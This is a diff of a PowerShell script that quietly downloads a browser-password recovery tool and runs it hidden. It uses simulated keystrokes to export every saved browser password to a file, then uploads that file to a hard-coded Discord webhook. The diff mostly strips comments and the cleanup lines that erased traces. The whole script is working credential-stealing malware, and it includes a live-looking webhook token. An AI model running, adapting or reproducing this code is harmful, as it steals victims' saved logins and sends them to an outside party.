@@ -5,13 +5,11 @@ if (Test-Path $tmpFolder) {
     Remove-Item $tmpFolder -Recurse -Force -ErrorAction SilentlyContinue 
 }
 
-# Create a new temporary folder
 New-Item -ItemType Directory -Path $tmpFolder | Out-Null
 Set-Location $tmpFolder
 
 Start-Sleep -Seconds 3
 
-# Define URLs and file paths
 $wbpvUrl = 'http://www.nirsoft.net/toolsdownload/webbrowserpassview.zip'
 $wbpvZip = 'wbpv.zip'
 $sevenZipUrl = 'https://www.7-zip.org/a/7za920.zip'
@@ -19,48 +17,37 @@ $sevenZipZip = '7z.zip'
 $extractionPassword = 'wbpv28821@'
 $filePath = Join-Path -Path $tmpFolder -ChildPath 'export.htm'
 
-# Set referer header for web requests
 $refererHeader = @{'Referer' = 'http://www.nirsoft.net/utils/web_browser_password.html'}
 
-# Download required files
 Invoke-WebRequest -Headers $refererHeader -Uri $wbpvUrl -OutFile $wbpvZip
 Invoke-WebRequest -Uri $sevenZipUrl -OutFile $sevenZipZip
 
 Start-Sleep -Seconds 5
 
-# Extract the 7-Zip archive
 Expand-Archive -Path $sevenZipZip -DestinationPath '7z'
 
 $sevenZipPath = '.\7z\7za.exe'
 $extractionArgs = "e", $wbpvZip, "-p$extractionPassword"
 
-# Extract the zip file using 7-Zip
 Start-Process -FilePath $sevenZipPath -ArgumentList $extractionArgs -Wait
 
-# Start WebBrowserPassView in hidden mode
-Start-Process -FilePath '.\WebBrowserPassView.exe' -WindowStyle Hidden
+$process = Start-Process -FilePath '.\WebBrowserPassView.exe' -WindowStyle Hidden -PassThru
 
-# Load the Windows Forms assembly for SendKeys functionality
 Add-Type -AssemblyName System.Windows.Forms
 
-# Allow time for the application to load
 Start-Sleep -Seconds 3
 
-# Simulate keyboard input to select all and save the file
 [System.Windows.Forms.SendKeys]::SendWait('^a')  # CTRL + A
 [System.Windows.Forms.SendKeys]::SendWait('^s')  # CTRL + S
 
-# Allow time for the save dialog to appear
-Start-Sleep -Seconds 1
+Start-Sleep -Seconds 5
 
-# Specify the filename and navigate to save
-[System.Windows.Forms.SendKeys]::SendWait('C:\temp\export.htm')  # Save to the specified path
-[System.Windows.Forms.SendKeys]::SendWait('{TAB}')  # Navigate to the Save button
-[System.Windows.Forms.SendKeys]::SendWait('{ENTER}')  # Press Enter to save
+$savePath = "C:\temp\export.htm"
+[System.Windows.Forms.SendKeys]::SendWait($savePath)
+[System.Windows.Forms.SendKeys]::SendWait('{ENTER}')
 
 Start-Sleep -Seconds 3
 
-# Check if the file exists before attempting to get it
 if (Test-Path $filePath) {
     $file = Get-Item $filePath
     $webhookUrl = "https://discord.com/api/webhooks/1333404978911510651/FVr2hApcOYlBDhSDad7s0Zr_kCIts4bBRz9OjYXOVsHH-uaY3nR3fNqP0bQ7lQSOGbRX"
@@ -69,9 +56,3 @@ if (Test-Path $filePath) {
     Write-Host "File not found: $filePath"
 }
 
-# Clean up temporary files
-Remove-Item -Recurse -Force -Path 'C:\temp\*'
-Stop-Process -Name "WebBrowserPassView" -Force -ErrorAction SilentlyContinue
-Stop-Process -Name "7z" -Force -ErrorAction SilentlyContinue
-Stop-Process -Name "7za" -Force -ErrorAction SilentlyContinue
-Stop-Process -Name "powershell" -Force -ErrorAction SilentlyContinue
